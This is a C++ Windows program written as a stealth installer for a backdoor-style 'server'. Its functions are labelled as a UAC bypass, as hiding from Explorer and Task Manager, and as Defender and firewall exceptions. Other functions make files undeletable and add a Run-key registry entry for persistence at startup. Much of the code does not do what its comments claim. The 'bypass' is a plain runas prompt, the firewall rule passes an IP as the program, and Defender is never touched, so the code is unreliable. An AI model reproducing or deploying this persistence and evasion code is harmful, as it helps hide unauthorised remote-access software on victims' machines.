#include <windows.h>
#include <iostream>
#include <string.h>
#include <shlobj.h>

using namespace std;

// UAC bypass function
BOOL BypassUAC()
{
    SHELLEXECUTEINFO ShExecInfo = {0};
    ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
    ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
    ShExecInfo.hwnd = NULL;
    ShExecInfo.lpVerb = "runas";
    ShExecInfo.lpFile = "cmd.exe";
    ShExecInfo.lpParameters = "/c net user Administrator /active:yes";
    ShExecInfo.lpDirectory = NULL;
    ShExecInfo.nShow = SW_HIDE;
    ShExecInfo.hInstApp = NULL;
    ShellExecuteEx(&ShExecInfo);
    WaitForSingleObject(ShExecInfo.hProcess, INFINITE);
    return TRUE;
}

// Install Server
BOOL InstallServer(char *fileName)
{
    // Elevate privileges
    if (BypassUAC())
    {
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ZeroMemory(&pi, sizeof(pi));
        CreateProcess(fileName, "127.0.0.1 6969", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    return TRUE;
}

// Hide from Explorer and Task Manager
BOOL HideFromExplorerAndTaskManager()
{
    // Create a blank file
    HANDLE hFile;
    hFile = CreateFile("C:\\Windows\\System32\\blank.dat", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    CloseHandle(hFile);

    // Hide the file from Explorer and Task Manager
    char systemPath[MAX_PATH];
    GetSystemDirectory(systemPath, MAX_PATH);
    strcat_s(systemPath, "\\blank.dat");
    SetFileAttributes(systemPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);

    return TRUE;
}

// Make an exception for Windows Defender and Windows Firewall
BOOL MakeExceptionForDefenderAndFirewall()
{
    SHELLEXECUTEINFO ShExecInfo = {0};
    ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
    ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
    ShExecInfo.hwnd = NULL;
    ShExecInfo.lpVerb = "runas";
    ShExecInfo.lpFile = "cmd.exe";
    ShExecInfo.lpParameters = "/c netsh advfirewall firewall add rule name=MyServer dir=in program=127.0.0.1 port=6969 action=allow";
    ShExecInfo.lpDirectory = NULL;
    ShExecInfo.nShow = SW_HIDE;
    ShExecInfo.hInstApp = NULL;
    ShellExecuteEx(&ShExecInfo);
    WaitForSingleObject(ShExecInfo.hProcess, INFINITE);
    return TRUE;
}

// Make the server undeletable
BOOL MakeServerUndeletable()
{
    char systemPath[MAX_PATH];
    GetSystemDirectory(systemPath, MAX_PATH);
    strcat_s(systemPath, "\\MyServer.exe");
    SetFileAttributes(systemPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_NOT_CONTENT_INDEXED);
    return TRUE;
}

// Make the server start on startup
BOOL MakeServerStartOnStartup()
{
    char myServerPath[MAX_PATH];
    GetSystemDirectory(myServerPath, MAX_PATH);
    strcat_s(myServerPath, "\\MyServer.exe");

    // Add the server to the registry
    HKEY hrun;
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hrun) == ERROR_SUCCESS)
    {
        RegSetValueEx(hrun, "MyServer", 0, REG_SZ, (LPBYTE)myServerPath, strlen(myServerPath));
        RegCloseKey(hrun);
    }

    return TRUE;
}

int main()
{
    // Install the server
    InstallServer("MyServer.exe");

    // Hide the server from Explorer and Task Manager
    HideFromExplorerAndTaskManager();

    // Make an exception for Windows Defender and Windows Firewall
    MakeExceptionForDefenderAndFirewall();

    // Make the server undeletable
    MakeServerUndeletable();

    // Make the server start on startup
    MakeServerStartOnStartup();

    return 0;
}
